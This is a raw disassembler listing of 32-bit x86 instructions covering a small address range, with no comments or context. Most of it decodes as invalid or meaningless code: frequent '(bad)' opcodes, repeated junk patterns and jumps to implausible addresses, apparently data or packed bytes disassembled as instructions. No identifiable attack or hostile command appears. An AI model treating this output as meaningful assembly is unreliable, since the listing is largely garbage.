  41bc72:	je     0x41bc75
  41bc74:	add    BYTE PTR [edx+0xa000174],bh
  41bc7a:	jne    0x41bc79
  41bc7c:	dec    DWORD PTR [edx]
  41bc7e:	jne    0x41bc7d
  41bc80:	(bad)  
  41bc81:	cli    
  41bc82:	add    al,0x4
  41bc84:	add    BYTE PTR [edx-0x75effffc],bh
  41bc8a:	je     0x41bc8d
  41bc8c:	adc    BYTE PTR [esi],al
  41bc8e:	xor    edi,ebp
  41bc90:	(bad)  
  41bc91:	jp     0x41bc97
  41bc93:	add    BYTE PTR [eax],al
  41bc95:	jp     0x41bc9b
  41bc97:	add    BYTE PTR [eax],al
  41bc99:	out    0x2e,al
  41bc9b:	std    
  41bc9c:	inc    edx
  41bc9e:	xor    ebp,edi
  41bca0:	dec    DWORD PTR [edx]
  41bca2:	sub    al,0xfd
  41bca4:	(bad)  
  41bca5:	jp     0x41bcab
  41bca7:	add    BYTE PTR [eax],al
  41bca9:	dec    edx
  41bcaa:	add    al,0x0
  41bcac:	add    BYTE PTR [ebp+ebp*1-0x3],dl
  41bcb0:	jmp    DWORD PTR [esi+0x2f]
  41bcb3:	std    
  41bcb4:	call   esi
  41bcb6:	xor    ch,bh
  41bcb8:	inc    DWORD PTR [eax]
	...
  41bcc6:	add    BYTE PTR [eax],al
  41bcc8:	arpl   WORD PTR [esi+0x1],bp
  41bccb:	add    BYTE PTR [ebx+0x6e],ah
  41bcce:	add    DWORD PTR [eax],eax
  41bcd0:	arpl   WORD PTR [edx+0x28],si
  41bcd3:	jmp    DWORD PTR [esi+eax*1]
  41bcd6:	call   FWORD PTR cs:[edx+eax*1]
  41bcda:	sub    al,0xff
  41bcdc:	adc    al,0x6e
  41bcde:	add    DWORD PTR [eax],eax
  41bce0:	arpl   WORD PTR [esi+0x1],bp
  41bce3:	add    BYTE PTR [ebx-0x1a],ah
  41bce6:	es (bad) 
  41bce8:	cld    
  41bce9:	sub    eax,0x8df4ff2e
  41bcee:	sub    al,0xff
  41bcf0:	in     al,dx
  41bcf1:	ins    DWORD PTR es:[edi],dx
  41bcf2:	add    DWORD PTR [eax],eax
  41bcf4:	arpl   WORD PTR [esi+0x1],bp
  41bcf7:	add    BYTE PTR [ebx-0x60],ah
  41bcfa:	daa    
  41bcfb:	call   esp
  41bcfd:	sub    DWORD PTR [ebx],0x2bd5ccff
  41bd03:	inc    esp
  41bd05:	ins    DWORD PTR es:[edi],dx
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	arpl   WORD PTR [esi+0x1],bp
  41bd0b:	add    BYTE PTR [ebx+0x62],ah
  41bd0e:	and    edi,edi
  41bd10:	lods   al,BYTE PTR ds:[esi]
  41bd11:	shr    DWORD PTR [ebx],0xff
  41bd14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd15:	cmp    DWORD PTR [edi+edi*8],ebp
  41bd18:	pushf  
  41bd19:	ins    DWORD PTR es:[edi],dx
  41bd1a:	add    DWORD PTR [eax],eax
  41bd1c:	arpl   WORD PTR [esi+0x1],bp
  41bd1f:	add    BYTE PTR [ebx+0x48],ah
  41bd22:	and    edi,edi
  41bd24:	test   ch,ch
  41bd26:	sub    eax,0x2a7d7cff
  41bd2b:	inc    DWORD PTR [eax]
	...
  41bd39:	add    BYTE PTR [eax],al
  41bd3b:	je     0x41bdaa
  41bd3d:	add    DWORD PTR [eax],eax
  41bd3f:	arpl   WORD PTR [esi+0x1],bp
  41bd42:	add    BYTE PTR [ebx+0x20],ah
  41bd45:	and    al,0xff
  41bd47:	pop    esp
  41bd48:	fldcw  WORD PTR ds:0x2ab154ff
  41bd4e:	dec    DWORD PTR [esi+eax*1-0x19]
  41bd52:	add    esp,DWORD PTR [ebx+0x5]
  41bd55:	out    0x3,eax
  41bd57:	arpl   WORD PTR ds:0x7f3422f9,ax
  41bd5d:	lahf   
  41bd5e:	sub    eax,0x3e77f2c
  41bd63:	arpl   WORD PTR ds:0x56303e7,ax
  41bd69:	out    0x3,eax
  41bd6b:	arpl   WORD PTR ds:0x56303e7,ax
  41bd71:	out    0x3,eax
  41bd73:	arpl   WORD PTR ds:0x7efc2db3,ax
  41bd79:	mov    DWORD PTR ds:0x2d7d7ef4,ebp
  41bd7f:	in     al,dx
  41bd80:	jle    0x41bd05
  41bd82:	sub    eax,0x2cef7ee4
  41bd87:	fdivr  QWORD PTR [esi-0x25]
  41bd8a:	sub    al,0xd4
  41bd8c:	jle    0x41bd57
  41bd8e:	sub    al,0xcc
  41bd90:	jle    0x41bdab
  41bd92:	sub    eax,0x2d1d7ec4
  41bd97:	mov    esp,0xb42ca37e
  41bd9c:	jle    0x41bd4d
  41bd9e:	sub    al,0x0
	...
  41bdac:	add    BYTE PTR [eax],al
  41bdae:	lods   al,BYTE PTR ds:[esi]
  41bdaf:	jle    0x41bd7c
  41bdb1:	sub    al,0xa4
  41bdb3:	jle    0x41bd76
  41bdb5:	sub    al,0x9c
  41bdb7:	jle    0x41be16
  41bdb9:	sub    al,0x94
  41bdbb:	jle    0x41bd40
  41bdbd:	sub    al,0x8c
  41bdbf:	jle    0x41be22
  41bdc1:	sub    al,0x84
  41bdc3:	jle    0x41bdf6
  41bdc5:	sub    al,0x7c
  41bdc7:	jle    0x41bdfc
  41bdc9:	sub    al,0x74
  41bdcb:	jle    0x41bdc8
  41bdcd:	sub    ebp,DWORD PTR [esi+edi*2+0x5]
  41bdd1:	sub    al,0x64
  41bdd3:	jle    0x41bdc2
  41bdd5:	daa    
  41bdd6:	pop    esp
  41bdd7:	jle    0x41bdd9
  41bdd9:	retf   
  41bdda:	jl     0x41be5a
  41bddc:	std    
  41bddd:	mov    ecx,0x2dfd7e84
  41bde2:	jnp    0x41be62
  41bde4:	std    
  41bde5:	inc    ebx
  41bde6:	mov    edi,DWORD PTR [esi-0x3]
  41bde9:	inc    ebp
  41bdea:	mov    edi,DWORD PTR [esi-0x3]
  41bded:	push   ecx
  41bdee:	jnp    0x41be6e
  41bdf0:	std    
  41bdf1:	jno    0x41be6e
  41bdf3:	jle    0x41bdf2
  41bdf5:	push   ebp
  41bdf6:	dec    ebx
  41bdf7:	jle    0x41bdf6
  41bdf9:	or     DWORD PTR [ebx+0x7e],0x7e3b71fd
  41be00:	std    
  41be01:	mov    bl,0x3b
  41be03:	jle    0x41be02
  41be05:	ret    
  41be06:	dec    ebx
  41be07:	jle    0x41be06
  41be09:	fwait
  41be0a:	dec    ebx
  41be0b:	jle    0x41be0a
  41be0d:	fistp  QWORD PTR [ebx]
  41be0f:	jle    0x41be0e
  41be11:	iret   
	...
  41be1e:	add    BYTE PTR [eax],al
  41be20:	add    BYTE PTR [ebx],bh
  41be22:	jle    0x41be21
  41be24:	mov    ebx,0x1dfd7e8b
  41be29:	mov    bh,BYTE PTR [esi-0x3]
  41be2c:	std    
  41be2d:	jnp    0x41bead
  41be2f:	std    
  41be30:	ins    DWORD PTR es:[edi],dx
  41be31:	jp     0x41beb1
  41be33:	std    
  41be34:	jns    0x41bdc0
  41be36:	jle    0x41be35
  41be38:	(bad)  
  41be3c:	xchg   edi,eax
  41be3d:	jp     0x41bebd
  41be3f:	std    
  41be40:	xchg   DWORD PTR [edx+0x7e],edi
  41be43:	std    
  41be44:	adc    eax,0x4dfd7e4a
  41be49:	dec    edx
  41be4a:	jle    0x41be49
  41be4c:	jmp    0xfc3f3c97
  41be51:	ds jle 0x41be51
  41be54:	leave  
  41be55:	inc    esi
  41be56:	jle    0x41be55
  41be58:	fnstcw WORD PTR [esi]
  41be5a:	jle    0x41be59
  41be5c:	test   eax,0xfd7e46
  41be61:	lods   al,BYTE PTR ds:[esi]
  41be62:	daa    
  41be63:	std    
  41be64:	dec    DWORD PTR [edx+0x9]
  41be67:	add    BYTE PTR [eax],al
  41be69:	shl    BYTE PTR [edx],1
  41be6b:	std    
  41be6c:	jmp    FWORD PTR [eax-0xf0002dd]
  41be72:	and    bh,ch
  41be74:	inc    DWORD PTR [eax]
  41be76:	and    edi,ebp
  41be78:	inc    DWORD PTR [eax]
  41be7a:	and    edi,ebp
  41be7c:	(bad)  
  41be7d:	cld    
  41be7e:	and    bh,ch
  41be80:	(bad)  
  41be81:	cmp    cl,BYTE PTR [ecx]
	...
  41be93:	add    BYTE PTR [edx],ah
  41be95:	and    edi,ebp
  41be97:	dec    DWORD PTR [edx]
  41be99:	or     DWORD PTR [eax],eax
  41be9b:	add    BYTE PTR [edx],ch
  41be9d:	and    al,0xfd
  41be9f:	call   FWORD PTR [edx]
  41bea1:	and    al,0xfd
  41bea3:	call   DWORD PTR [esi]
  41bea5:	and    al,0xfd
  41bea7:	dec    DWORD PTR [eax+0x24]
  41beaa:	std    
  41beab:	jmp    FWORD PTR [edx]
  41bead:	and    al,0xfd
  41beaf:	call   FWORD PTR [edx+0x24]
  41beb2:	std    
  41beb3:	(bad)  
  41beb4:	fisub  DWORD PTR [ebx]
  41beb6:	std    
  41beb7:	dec    DWORD PTR [eax+0x23]
  41beba:	std    
  41bebb:	jmp    FWORD PTR [eax]
  41bebd:	and    edi,ebp
  41bebf:	push   edx
  41bec1:	and    edi,ebp
  41bec3:	dec    edx
  41bec5:	or     BYTE PTR [eax],al
  41bec7:	add    BYTE PTR [ebx+eiz*1+0x8bafffd],al
  41bece:	add    BYTE PTR [eax],al
  41bed0:	sbb    BYTE PTR [ebx],ah
  41bed2:	std    
  41bed3:	call   DWORD PTR [ebx+eiz*1-0x3]
  41bed7:	dec    DWORD PTR [edx-0x4dfffff8]
  41bedd:	sub    ch,bh
  41bedf:	call   DWORD PTR [esi-0x650002d8]
  41bee5:	sub    ch,bh
  41bee7:	jmp    DWORD PTR [ebx+0x52]
  41beea:	and    edi,edi
  41beec:	ins    BYTE PTR es:[edi],dx
  41beed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41beee:	and    edi,edi
  41bef0:	mov    al,fs:0x6e5cff21
  41bef6:	add    DWORD PTR [eax],eax
	...
  41bf04:	add    BYTE PTR [eax],al
  41bf06:	add    BYTE PTR [ebx-0x78],ah
  41bf09:	and    edi,edi
  41bf0b:	dec    esp
  41bf0c:	hlt    
  41bf0d:	and    bh,bh
  41bf0f:	inc    esp
  41bf10:	in     al,dx
  41bf11:	and    edi,edi
  41bf13:	cmp    al,0xfe
  41bf15:	and    edi,edi
  41bf17:	xor    al,0xf8
  41bf19:	and    edi,edi
  41bf1b:	sub    al,0x86
  41bf1d:	and    al,0xff
  41bf1f:	and    al,0xfe
  41bf21:	and    edi,edi
  41bf23:	sbb    al,0x88
  41bf25:	and    al,0xff
  41bf27:	adc    al,0xb0
  41bf29:	and    al,0xff
  41bf2b:	or     al,0x9e
  41bf2d:	and    al,0xff
  41bf2f:	add    al,0x6e
  41bf31:	add    DWORD PTR [eax],eax
  41bf33:	arpl   WORD PTR [eax-0x6c0b00dc],bx
  41bf39:	and    al,0xff
  41bf3b:	in     al,dx
  41bf3c:	ins    DWORD PTR es:[edi],dx
  41bf3d:	add    DWORD PTR [eax],eax
  41bf3f:	arpl   WORD PTR [edx-0x702300d6],bx
  41bf45:	sub    bh,bh
  41bf47:	aam    0x83
  41bf49:	sub    bh,bh
  41bf4b:	int3   
  41bf4c:	jmp    0x7606be7a
  41bf51:	sub    bh,bh
  41bf53:	mov    esp,0xb4ff2871
  41bf58:	(bad)  
  41bf5a:	jmp    FWORD PTR [edi+ebx*1+0x3a4ff27]
  41bf61:	daa    
  41bf62:	call   FWORD PTR [ecx+ebp*4-0x6a6b00d8]
  41bf69:	sub    bh,bh
	...
  41bf77:	add    BYTE PTR [eax],al
  41bf79:	add    BYTE PTR [ecx+eax*2+0x484ff28],cl
  41bf80:	mov    eax,ds:0x757b7c28
  41bf85:	sub    DWORD PTR [ebx+edi*2+0x4b],esi
  41bf89:	sub    DWORD PTR [ebx+edi*2+0x51],ebp
  41bf8d:	sub    DWORD PTR [ebx+edi*2+0x31],esp
  41bf91:	sub    DWORD PTR [ebx+edi*2+0x1b],ebx
  41bf95:	sub    DWORD PTR [ebx+edi*2+0x3],edx
  41bf99:	sub    DWORD PTR [ebx+edi*2-0x13],ecx
  41bf9d:	sub    BYTE PTR [ebx+edi*2-0xb],al
  41bfa1:	daa    
  41bfa2:	cmp    al,0x7b
  41bfa4:	or     DWORD PTR [eax],ebp
  41bfa6:	xor    al,0x7b
  41bfa8:	pop    ss
  41bfa9:	sub    BYTE PTR [ebx+edi*2],ch
  41bfac:	and    ebp,DWORD PTR [eax]
  41bfae:	and    al,0x7b
  41bfb0:	and    DWORD PTR [eax],ebp
  41bfb2:	sbb    al,0x7b
  41bfb4:	dec    ebx
  41bfb5:	sub    BYTE PTR [ebx+edi*2],dl
  41bfb8:	das    
  41bfb9:	sub    BYTE PTR [ebx+edi*2],cl
  41bfbc:	pop    edi
  41bfbd:	daa    
  41bfbe:	add    al,0x7b
  41bfc0:	jnp    0x41bfe9
  41bfc2:	cld    
  41bfc3:	jp     0x41c014
  41bfc5:	daa    
  41bfc6:	hlt    
  41bfc7:	jp     0x41c018
  41bfc9:	daa    
  41bfca:	in     al,dx
  41bfcb:	jp     0x41bf6e
  41bfcd:	daa    
  41bfce:	in     al,0x7a
  41bfd0:	mov    eax,ds:0x797adc27
  41bfd5:	daa    
  41bfd6:	aam    0x7a
  41bfd8:	in     eax,0x26
  41bfda:	int3   
  41bfdb:	jp     0x41bfa2
  41bfdd:	add    BYTE PTR es:[eax],al
	...
  41bfec:	add    ah,al
  41bfee:	jp     0x41c009
  41bff0:	daa    
  41bff1:	mov    esp,0xb426b37a
  41bff6:	jp     0x41bfbb
  41bff8:	lods   al,BYTE PTR es:[esi]
  41bffa:	jp     0x41c05f
  41bffc:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41bffe:	jp     0x41c057
  41c000:	es pushf 
  41c002:	jp     0x41bf89
  41c004:	es xchg esp,eax
  41c006:	jp     0x41c008
  41c008:	jg     0x41c04f
  41c00a:	jp     0x41c009
  41c00c:	outs   dx,DWORD PTR ds:[esi]
  41c00d:	cmp    eax,0x453dfd7a
  41c012:	jp     0x41c011
  41c014:	add    eax,0xe9fd7a3d
  41c019:	inc    esi
  41c01a:	jp     0x41c019
  41c01c:	sti    
  41c01d:	ds jp  0x41c01d
  41c020:	leave  
  41c021:	xchg   BYTE PTR [edx-0x3],bh
  41c024:	mov    ecx,0xa9fd7a7e
  41c029:	xchg   BYTE PTR [edx-0x3],bh
  41c02c:	lahf   
  41c02d:	jle    0x41c0a9
  41c02f:	std    
  41c030:	jmp    0x6341c595
  41c035:	inc    ecx
  41c036:	jnp    0x41c035
  41c038:	jnp    0x41c07b
  41c03a:	jnp    0x41c039
  41c03c:	add    DWORD PTR [ecx+0x7b],0xfffffffd
  41c040:	add    DWORD PTR [ecx],0x7b
  41c043:	std    
  41c044:	mov    bl,0x1
  41c046:	jnp    0x41c045
  41c048:	xchg   edi,eax
  41c049:	add    DWORD PTR [ebx-0x3],edi
  41c04c:	jmp    0xa141c5b1
	...
  41c05d:	add    BYTE PTR [eax],al
  41c05f:	add    BYTE PTR [ecx],al
  41c061:	jnp    0x41c060
  41c063:	jmp    0xf941c5c8
  41c068:	add    DWORD PTR [ebx-0x3],edi
  41c06b:	leave  
  41c06c:	add    DWORD PTR [ebx-0x3],edi
  41c06f:	mov    ebp,0x2bfd7ac1
  41c074:	sar    BYTE PTR [edx-0x3],0x19
  41c078:	sar    BYTE PTR [edx-0x3],0x9
  41c07c:	sar    BYTE PTR [edx-0x3],0xd9
  41c080:	sar    DWORD PTR [edx-0x3],0x6b
  41c084:	sar    BYTE PTR [edx-0x3],0x7b
  41c088:	sar    BYTE PTR [edx-0x3],0x81
  41c08c:	sar    BYTE PTR [edx-0x3],0x0
  41c090:	mov    al,BYTE PTR ds:0x663c0000
  41c096:	(bad)  
  41c097:	(bad)  
  41c098:	jp     0x41c09f
  41c09a:	add    BYTE PTR [eax],al
  41c09c:	sbb    BYTE PTR [esi-0x2],ah
  41c09f:	call   FWORD PTR [esi+eiz*2-0x2]
  41c0a3:	dec    DWORD PTR [edx+0x72000005]
  41c0a9:	gs (bad) 
  41c0ab:	call   FWORD PTR [esi+0x1afffe65]
  41c0b1:	gs (bad) 
  41c0b3:	call   DWORD PTR [esi]
  41c0b5:	gs (bad) 
  41c0b7:	(bad)  
  41c0b8:	cld    
  41c0b9:	fs (bad) 
  41c0bb:	(bad)  
  41c0bc:	call   0x4b41bf25
  41c0c1:	add    eax,0x0
	...
  41c0d2:	add    BYTE PTR [eax-0x7300019f],dl
  41c0d8:	popa   
  41c0d9:	(bad)  
  41c0da:	(bad)  
  41c0db:	mov    esp,0xbafffe64
  41c0e0:	fs (bad) 
  41c0e2:	inc    DWORD PTR [eax-0x1d00019c]
  41c0e8:	fs (bad) 
  41c0ea:	dec    DWORD PTR [edx-0x7f00019c]
  41c0f0:	fs (bad) 
  41c0f2:	dec    eax
  41c0f4:	fs (bad) 
  41c0f6:	jmp    FWORD PTR [edx-0x500019c]
  41c0fc:	add    al,0x0
  41c0fe:	add    al,dh
  41c100:	fs (bad) 
  41c102:	call   DWORD PTR [esp+eiz*2-0x2]
  41c106:	(bad)  
  41c107:	mov    edx,0xf7000004
  41c10c:	add    al,0x3f
  41c10e:	jb     0x41c0bf
  41c110:	popa   
  41c111:	jno    0x41c178
  41c113:	cld    
  41c114:	imul   ebp,DWORD PTR [ecx+0x65],0x3f01ad63
  41c11b:	popa   
  41c11c:	mov    esp,0xa8075ee8
  41c121:	in     al,dx
  41c122:	imul   edi,esi,0x6d
  41c125:	add    DWORD PTR [ecx],esp
  41c127:	arpl   WORD PTR [ebx+0x41106ced],bp
  41c12d:	leave  
  41c12e:	pop    esi
  41c12f:	or     eax,0x6362ed8a
  41c134:	and    eax,DWORD PTR [ebx]
  41c136:	push   ebp
	...
  41c143:	add    BYTE PTR [eax],al
  41c145:	add    cl,dh
  41c147:	test   ch,dh
  41c149:	bound  ebx,QWORD PTR ds:0x6362ed85
  41c14f:	popa   
  41c150:	push   es
  41c151:	ins    BYTE PTR es:[edi],dx
  41c152:	shl    dl,1
  41c154:	repnz imul eax,esi,0xffffff80
  41c158:	(bad)  
  41c159:	inc    DWORD PTR [esi+edi*1+0x4]
  41c15d:	inc    ebp
  41c15e:	iret   
  41c15f:	iret   
  41c160:	in     eax,0x5e
  41c162:	(bad)  
  41c163:	sub    ch,bh
  41c165:	pusha  
  41c166:	mov    eax,0x62b5016e
  41c16b:	pop    ds
  41c16c:	lock ins BYTE PTR es:[edi],dx
  41c16e:	or     ebp,0xca8552ef
  41c174:	out    dx,al
  41c175:	pusha  
  41c176:	js     0x41c1e6
  41c178:	add    esp,esi
  41c17a:	bound  ebx,QWORD PTR [edx]
  41c17c:	out    dx,eax
  41c17d:	pusha  
  41c17e:	adc    BYTE PTR [edx],0xca
  41c181:	jno    0x41c201
  41c183:	add    DWORD PTR [eax+esi*8],eax
  41c186:	bound  esp,QWORD PTR [edx]
  41c188:	out    dx,eax
  41c189:	pusha  
  41c18a:	cmp    BYTE PTR [edx-0x3e],0x6b
  41c18e:	dec    edi
  41c18f:	pavgw  mm7,mm7
  41c192:	aam    0x64
  41c194:	add    al,0x6c
  41c196:	push   eax
  41c197:	jp     0x41c18c
  41c199:	pusha  
  41c19a:	push   ebx
  41c19b:	jne    0x41c15f
  41c19d:	(bad)  
  41c19e:	mov    esp,0x4704fa04
  41c1a3:	hlt    
  41c1a4:	shl    ch,cl
  41c1a6:	inc    ebx
  41c1a7:	out    0xda,al
  41c1a9:	ret    0x0
	...
  41c1b8:	add    BYTE PTR [edi+esi*2-0x1dd9fd0a],ah
  41c1bf:	mov    edx,0xc3e8fdc9
  41c1c4:	ret    0xf110
  41c1c7:	mov    eax,0xb2f202ea
  41c1cc:	out    0xf3,al
  41c1ce:	(bad)
  41c1d1:	fadd   DWORD PTR [esp+eiz*4]
  41c1d4:	sti    
  41c1d5:	cld    
  41c1d6:	in     eax,0x84
  41c1d8:	out    0x21,eax
  41c1da:	out    0x94,eax
  41c1dc:	jmp    0xe7c1:0xee94e6d2
  41c1e3:	jb     0x41c1b9
  41c1e5:	shl    bl,1
  41c1e7:	jg     0x41c1da
  41c1e9:	mov    edi,0x5f03a7f2
  41c1ee:	add    al,0x2e
  41c1f0:	out    0xb0,eax
  41c1f2:	mov    edi,0xd2c1f04f
  41c1f7:	aas    
  41c1f8:	inc    cl
  41c1fa:	add    eax,0xf3a2040d
  41c1ff:	dec    ebx
  41c200:	jecxz  0x41c192
  41c202:	loopne 0x41c228
  41c204:	jmp    0x41c27e
  41c206:	loopne 0x41c22b
  41c208:	jecxz  0x41c27e
  41c20a:	cmc    
  41c20b:	aas    
  41c20c:	repnz xchg esp,eax
  41c20f:	out    0x3,al
  41c211:	arpl   WORD PTR [ebx],ax
  41c213:	sub    al,0xe3
  41c215:	jl     0x41c1e6
  41c217:	jmp    esi
  41c219:	outs   dx,DWORD PTR ds:[esi]
  41c21a:	mov    BYTE PTR [edx+ecx*8],0x0
	...
  41c22a:	add    BYTE PTR [eax],al
  41c22c:	inc    ebp
  41c22d:	jmp    0x3f3c63d
  41c232:	adc    al,0xf2
  41c234:	cmp    esp,esp
  41c236:	(bad)  
  41c237:	clc    
  41c238:	stos   BYTE PTR es:[edi],al
  41c239:	fbld   TBYTE PTR [edx-0xa]
  41c23c:	xchg   ebx,eax
  41c23d:	loopne 0x41c284
  41c23f:	rol    ah,1
  41c241:	jecxz  0x41c242
  41c243:	push   edx
  41c244:	popa   
  41c245:	leave  
  41c246:	ins    BYTE PTR es:[edi],dx
  41c247:	enter  0xcabc,0x66
  41c24b:	retf   
  41c24c:	xchg   esi,eax
  41c24d:	xlat   BYTE PTR ds:[ebx]
  41c24e:	jno    0x41c210
  41c250:	mov    eax,ds:0x619afd76
  41c255:	shl    BYTE PTR [edx-0x43],0xb0
  41c259:	hlt    
  41c25a:	ins    BYTE PTR es:[edi],dx
  41c25b:	retf   0xe2a1
  41c25e:	arpl   WORD PTR [ebx-0x168f0a83],bx
  41c264:	pusha  
  41c265:	cmp    edi,0x53f27dad
  41c26b:	test   BYTE PTR [ebp-0x1a],cl
  41c26e:	dec    edi
  41c26f:	mov    BYTE PTR [esi+ebx*8+0x3e],cl
  41c273:	jmp    0xaa41f4d8
  41c278:	dec    esi
  41c279:	jecxz  0x41c2d9
  41c27b:	jne    0x41c2c2
  41c27d:	ret    0x5b66
  41c280:	dec    edx
  41c281:	in     eax,0x73
  41c283:	dec    esi
  41c284:	xor    edi,ebp
  41c286:	ds jmp 0x2541a0ec
  41c28c:	or     ch,dl
  41c28e:	bound  edi,QWORD PTR ds:0x0
	...
  41c29c:	add    BYTE PTR [eax],al
  41c29e:	add    BYTE PTR [edx],cl
  41c2a0:	shl    BYTE PTR [esi+0x4d],0xfa
  41c2a4:	ss add cl,ch
  41c2a7:	pop    edi
  41c2a8:	shl    BYTE PTR [edx+0x35],0x20
  41c2ac:	repz jno 0x41c2ca
  41c2af:	or     ch,al
  41c2b1:	jae    0x41c2ec
  41c2b3:	icebp  
  41c2b4:	call   0xf531cf19
  41c2b9:	call   FWORD PTR [eax+0x66d061]
  41c2bf:	data16 ins BYTE PTR es:[edi],dx
  41c2c1:	inc    eax
  41c2c2:	push   0x6f51735b
  41c2c7:	jg     0x41c345
  41c2c9:	imul   esi,DWORD PTR [ebx+eiz*2+0x43],0x1a77476
  41c2d1:	lods   eax,DWORD PTR ds:[esi]
  41c2d2:	add    BYTE PTR [ecx+ebp*2],al
  41c2d5:	imul   esp,DWORD PTR [esp+esi*8+0x68],0x6f
  41c2da:	jae    0x41c292
  41c2dc:	aas    
  41c2dd:	data16 ins BYTE PTR es:[edi],dx
  41c2df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e0:	inc    eax
  41c2e1:	std    
  41c2e2:	push   DWORD PTR [ebp-0x398c93fe]
  41c2e8:	jae    0x41c34a
  41c2ea:	ins    DWORD PTR es:[edi],dx
  41c2eb:	mov    edx,0x3e68
  41c2f0:	add    DWORD PTR [esi+0x69],eax
  41c2f3:	fcomp  QWORD PTR [ebp+0x4b]
  41c2f6:	shr    BYTE PTR gs:[ebp+0x43],cl
  41c2fa:	imul   ebx,esi,0xaf003e5d
  41c300:	or     DWORD PTR [esi+0x69],eax
	...
  41c30f:	add    BYTE PTR [eax],al
  41c311:	add    ah,bl
  41c313:	ins    BYTE PTR es:[edi],dx
  41c314:	inc    eax
  41c315:	ins    BYTE PTR es:[edi],dx
  41c316:	fnsave [edi+0x62]
  41c319:	add    dh,dh
  41c31b:	or     DWORD PTR [ebx+0x65],eax
  41c31e:	xchg   esi,eax
  41c31f:	push   esi
  41c320:	ins    BYTE PTR es:[edi],dx
  41c321:	fs xchg edi,eax
  41c323:	jne    0x41c387
  41c325:	dec    eax
  41c326:	fwait
  41c327:	arpl   WORD PTR [ecx+0x6c],sp
  41c32a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c32b:	dec    edx
  41c32c:	std    
  41c32d:	push   DWORD PTR [ecx+ecx*1+0x5b566543]
  41c334:	bound  esi,QWORD PTR [edx+0x49]
  41c337:	bound  ebp,QWORD PTR [esi+ebp*2+0x47]
  41c33b:	jno    0x41c37b
  41c33d:	add    BYTE PTR [eax],dl
  41c33f:	or     al,BYTE PTR [ebx+0x65]
  41c342:	push   esi
  41c343:	push   ebp
  41c344:	ins    BYTE PTR es:[edi],dx
  41c345:	arpl   WORD PTR [ebx-0x3],sp
  41c348:	out    dx,eax
  41c349:	bound  ebp,QWORD PTR [edx]
  41c34b:	je     0x41c330
  41c34d:	ins    BYTE PTR es:[edi],dx
  41c34e:	and    bl,BYTE PTR [esi+0x1]
  41c351:	je     0x41c3b5
  41c353:	sub    esp,edi
  41c355:	jae    0x41c387
  41c357:	jne    0x41c34b
  41c359:	jae    0x41c3a1
  41c35b:	jno    0x41c329
  41c35d:	ins    DWORD PTR es:[edi],dx
  41c35e:	cmp    eax,0x62a0015b
  41c363:	stos   DWORD PTR es:[edi],eax
  41c364:	call   0xeb86cfdc
  41c369:	arpl   WORD PTR [ebx+ebx*2],cx
  41c36c:	repnz inc ebx
  41c36e:	or     dh,BYTE PTR [eax+0x431760e8]
  41c374:	out    dx,eax
  41c375:	jbe    0x41c377
	...
  41c383:	add    BYTE PTR [eax],al
  41c385:	and    bl,BYTE PTR [esi+0x1]
  41c388:	dec    ebp
  41c389:	bound  ebp,QWORD PTR [ebx-0x6fec8c18]
  41c38f:	in     al,dx
  41c390:	jne    0x41c394
  41c392:	call   0x66e3:0x8af14fe8
  41c399:	iret   
  41c39a:	mov    edx,edx
  41c39c:	jae    0x41c36f
  41c39e:	xchg   ebp,eax
  41c39f:	jmp    0x41c405
  41c3a1:	mov    ds:0x617a015e,al
  41c3a6:	(bad)
  41c3aa:	stc    
  41c3ab:	out    dx,al
  41c3ac:	jno    0x41c36c
  41c3ae:	fdivr  st(7),st
  41c3b0:	inc    ebx
  41c3b1:	mov    edx,0xaf60e4d0
  41c3b6:	retf   
  41c3b7:	icebp  
  41c3b8:	jbe    0x41c35c
  41c3ba:	pop    esi
  41c3bb:	add    DWORD PTR [ebx],edx
  41c3bd:	pusha  
  41c3be:	(bad)  
  41c3c0:	jae    0x41c353
  41c3c2:	mov    edi,0x5ea26fec
  41c3c7:	add    DWORD PTR [edx+eiz*2+0x2b],ecx
  41c3cb:	in     eax,0x73
  41c3cd:	xchg   ebx,eax
  41c3ce:	add    eax,0xe676eb19
  41c3d3:	adc    ah,bh
  41c3d5:	xchg   esp,eax
  41c3d6:	test   DWORD PTR ds:0x3e145e6,0xfae841d1
  41c3e0:	jmp    0xea39:0xe32ce33f
  41c3e7:	stc    
  41c3e8:	ret    0x0
	...
  41c3f7:	add    BYTE PTR [ebx+esi*2-0x15e1fce0],bh
  41c3fe:	fcmovbe st,st(3)
  41c400:	xor    bl,dh
  41c402:	aam    0xe2
  41c404:	xor    dl,ch
  41c406:	mov    dh,0xf1
  41c408:	por    mm7,QWORD PTR [edi-0x2b41fe11]
  41c40f:	test   DWORD PTR [ebp+0x5],0xea1e043d
  41c416:	mov    edx,0xb8f6f1c0
  41c41b:	out    0x6,al
  41c41d:	stc    
  41c41e:	stos   BYTE PTR es:[edi],al
  41c41f:	jmp    0xf6f7:0xf789e9f2
  41c426:	pop    edx
  41c428:	pop    esp
  41c429:	jae    0x41c418
  41c42b:	add    bh,al
  41c42d:	idiv   BYTE PTR [edx-0xf]
  41c430:	mov    eax,0x44d48ce8
  41c435:	jae    0x41c41b
  41c437:	add    DWORD PTR [eax-0x42088508],ebp
  41c43d:	(bad)  
  41c43e:	pop    edi
  41c43f:	clc    
  41c440:	rcr    ecx,0x4d
  41c443:	aad    0xbd
  41c445:	jmp    0xe4c68595
  41c44a:	pop    eax
  41c44b:	add    al,0xe8
  41c44d:	add    al,0x2e
  41c44f:	out    0x90,eax
  41c451:	(bad)  [edi-0x1f]
  41c454:	jnp    0x41c41c
  41c456:	inc    DWORD PTR [ebp-0xc]
  41c459:	loopne 0x41c4ce
  41c45b:	jmp    0x41c460
	...
  41c468:	add    BYTE PTR [eax],al
  41c46a:	add    BYTE PTR [eax-0x54],ah
  41c46d:	add    bh,BYTE PTR [edx]
  41c46f:	repz out 0x62,eax
  41c472:	sbb    DWORD PTR [edi+0x37],ebx
  41c475:	jmp    FWORD PTR ds:0xfe4af6c4
  41c47b:	mov    esp,0xa50c6bf7
  41c480:	jmp    0x41c4ed
  41c482:	add    al,0x95
  41c484:	shr    DWORD PTR [edx+0xc],cl
  41c487:	mov    al,ds:0x61c1fd72
  41c48c:	enter  0xdd62,0x9c
  41c490:	shl    DWORD PTR [eax-0x2b],cl
  41c493:	popf   
  41c494:	hlt    
